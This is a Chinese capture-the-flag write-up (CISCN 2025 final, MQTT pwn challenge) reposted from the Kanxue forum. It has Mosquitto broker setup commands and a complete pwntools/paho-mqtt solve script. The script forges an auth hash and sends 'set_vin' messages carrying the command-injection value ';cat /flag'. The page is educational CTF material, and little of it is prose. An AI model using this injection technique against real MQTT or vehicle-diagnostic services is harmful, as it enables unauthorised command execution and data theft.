# mqtt 协议pwn入门（ciscn2025 final mqtt）

> 原文: https://www.ctfiot.com/263183.html
> ID: 263183

1

mqtt协议中的交互角色

2

服务环境搭建

sudo apt updatesudo apt install mosquitto mosquitto-clients

sudo systemctl enable mosquittosudo systemctl start mosquitto

mosquitto_sub -h localhost -t test/topic

mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"

sudo vim /etc/mosquitto/mosquitto.conf

listener 9999 #设置监听端口为 9999allow_anonymous true  # 可选，允许匿名访问（默认）sudo systemctl restart mosquitto # 重启服务

3

题目复盘

#! /usr/bin/python3import randomfrom pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return iodef dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":auth,        "cmd":cmd,        "arg":arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return resultdef on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:08x}")    return  f"{v3:08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()

4

总结

看雪ID：sparkle666

https://bbs.kanxue.com/user-home-1010243.htm

*本文为看雪论坛优秀文章，由 sparkle666 原创，转载请注明来自看雪社区

SDC 2025 早鸟票限时开售！议题火热征集中～

# 往期推荐

安卓旧系统 OTA 包分析与漏洞提权适配

XCTF L3HCTF 2025 pwn 方向解题思路

Pwn题解析｜L3CTF 2025 heack & heack_revenge

OLLVM-BR间接混淆去除

House of Einherjar

球分享

球点赞

球在看

点击阅读原文查看更多


```
sudo apt updatesudo apt install mosquitto mosquitto-clients
```



```
sudo systemctl enable mosquittosudo systemctl start mosquitto
```



```
mosquitto_sub -h localhost -t test/topic
```



```
mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"
```



```
sudo vim /etc/mosquitto/mosquitto.conf
```



```
listener 9999 #设置监听端口为 9999allow_anonymous true  # 可选，允许匿名访问（默认）sudo systemctl restart mosquitto # 重启服务
```



```
#! /usr/bin/python3import randomfrom pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return iodef dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":auth,        "cmd":cmd,        "arg":arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return resultdef on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:08x}")    return  f"{v3:08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962487-wxsync-2025-07-0d991fbf78a0a7fcce80edb4b3e91b4d.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962489-wxsync-2025-07-d7c09efe99896efceb8fe2b43dc54c24.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962490-wxsync-2025-07-d0b25a1a5d35cca27b932405d922c0cd.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962491-wxsync-2025-07-2402aa7d251f1d724bcfb7d9cee6e234.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962493-wxsync-2025-07-2cda3ba08ebf1a2ea00c2d48a7088a89.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962495-wxsync-2025-07-12b4dcfbaead39f7666122fcbdda16af.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962496-wxsync-2025-07-46a0151ef8a21f41f9802a52e54e3246.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962498-wxsync-2025-07-88de0359deac0b6adf789fdcf870c19d.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962499-wxsync-2025-07-d37e9ed2927de4aa3318ddc7de67bc8d.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753962501-wxsync-2025-07-74cd7e8d30f049e03a51f040b68e50e7.jpg)